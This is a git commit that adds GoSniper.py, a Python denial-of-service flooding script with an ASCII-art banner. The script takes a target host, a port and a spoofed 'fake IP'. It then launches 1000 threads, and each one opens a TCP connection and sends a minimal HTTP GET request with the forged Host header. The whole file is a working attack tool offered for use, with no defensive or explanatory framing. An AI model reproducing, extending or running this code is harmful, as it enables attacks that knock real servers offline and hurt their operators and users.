e053d803811bc69e5a7068eae379508b0aa2c0ad
Discordmodsbers <94165954+Discordmodsbers@users.noreply.github.com>
2022-08-20 02:24:50 -0400

    Create GoSniper.py

---
+++ GoSniper.py
@@ -0,0 +1,69 @@
+import socket
+import threading
+import argparse
+import os
+os.system('clear')
+# Initialize parser
+parser = argparse.ArgumentParser()
+ 
+# Adding optional argument
+parser.add_argument("-T", "--Target", help = "Enter target to flood")
+parser.add_argument("-p", "--Port", help = "Enter server port")
+parser.add_argument("-F", "--Fakeip", help = "Fake but valid ip")
+parser.add_argument("-M", "--Method", help = "Changes method")
+# Read arguments from command line
+args = parser.parse_args()
+
+target = (args.Target)
+Port = int(args.Port)
+Fakeip = (args.Fakeip)
+attack_num = 0
+
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
+os.system('clear')
+print(bcolors.OKBLUE + """ .:'                                  `:.
+ ::'                                    `::
+:: :.                                  .: ::
+ `:. `:.             .             .:'  .:'
+   `::. `::          !           ::' .::'
+      `::.`::.    .' ! `.    .::'.::'
+        `:.  `::::'':!:``::::'   ::'
+        :'*:::.  .:' ! `:.  .:::*`:
+       :: HHH::.   ` ! '   .::HHH ::
+      ::: `H TH::.  `!'  .::HT H' :::
+      ::..  `THHH:`:   :':HHHT'  ..::
+      `::      `T: `. .' :T'      ::'
+        `:. .   :         :   . .:'
+          `::'               `::'
+            :'  .`.  .  .'.  `:
+            :' ::.       .:: `:
+            :' `:::     :::' `:
+             `.  ``     ''  .'
+              :`...........':
+              ` :`.     .': '
+               `:  `"""'  :' """Version: 2.1""")
+print(bcolors.OKGREEN + "Running DoS")
+print(bcolors.RESET + "")
+def attack():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target, Port))
+    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, Port))
+    s.sendto(("Host: " + Fakeip + "\r\n\r\n").encode('ascii'), (target, Port))
+    s.close() 
+
+
+for i in range(1000):
+    thread = threading.Thread(target=attack)
+    thread.start()
